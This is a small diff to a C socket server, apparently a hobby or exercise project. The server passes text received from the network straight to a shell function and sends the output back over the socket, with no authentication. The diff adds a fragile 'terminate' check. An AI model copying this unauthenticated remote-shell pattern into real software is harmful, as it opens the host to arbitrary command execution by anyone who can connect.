@@ -5,7 +5,7 @@
 #include <netinet/in.h>
 #include <string.h>
 #include "port.h"
-#include "shellfunc.c"
+#include "shellfunc.h"
 
 int main(int argc, char const *argv[])
 {
@@ -54,6 +54,8 @@ int main(int argc, char const *argv[])
 
     while(new_socket){
         valread = read(new_socket , buffer, 1024);
+        if(strcmp(buffer, "terminate") == 10)
+            return 0;
         dup2(new_socket, STDOUT_FILENO );
         runshell(buffer);
     }
